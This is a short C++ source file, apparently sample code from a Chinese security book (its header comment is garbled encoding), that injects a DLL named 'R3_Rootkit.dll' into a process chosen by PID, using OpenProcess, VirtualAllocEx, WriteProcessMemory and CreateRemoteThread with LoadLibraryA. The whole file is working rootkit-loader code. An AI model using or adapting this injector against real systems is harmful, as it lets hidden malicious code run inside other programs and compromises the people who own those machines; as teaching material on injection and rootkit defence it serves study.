/*
*  ���ڿ���ɱ���������Ӵ���
*
*  ��    �ߣ���������A1Pass��
*  ��    �ڣ�2012-12-14
*  ���������http://book.hackav.com  �� http://www.hzbook.com
*  ����΢����http://weibo.com/a1pass �� http://t.qq.com/a1pass
*  ���߲��ͣ�http://a1pass.blog.163.com
*/
#include "stdafx.h"
#include <iostream>
#include <windows.h>
using namespace std;


void InjectDLL(DWORD dwProcessID)
{
	PCHAR  strDllPath = "R3_Rootkit.dll";
	HANDLE hProc      = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	LPVOID fnLoadLib  = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	LPVOID lpRemotStr = (LPVOID)VirtualAllocEx(hProc, NULL, strlen(strDllPath), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	
	WriteProcessMemory(hProc, lpRemotStr, strDllPath, strlen(strDllPath), NULL);
	CreateRemoteThread(hProc,NULL,NULL, (LPTHREAD_START_ROUTINE)fnLoadLib, lpRemotStr, NULL, NULL);
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD dwProcessID = 0;
	cout << "Plase Enter Hook PID:";
	cin  >> dwProcessID;

	InjectDLL(dwProcessID);

	return 0;
}

